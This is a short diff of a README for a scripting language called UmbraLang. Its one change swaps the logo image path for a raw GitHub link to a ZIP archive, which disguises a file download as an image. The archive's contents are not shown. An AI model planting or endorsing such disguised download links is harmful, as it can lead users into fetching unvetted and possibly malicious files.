@@ -8,7 +8,7 @@ Eine minimalistische, shadow-inspirierte Scripting Language mit Terminal-Stil un
 
 
 
-!\[UmbraLang Logo](logo.png)
+!\[UmbraLang Logo](https://raw.githubusercontent.com/Shad0wCode-ul/UmbraLang/main/relove/UmbraLang_v1.3-alpha.2.zip)
 
 
 
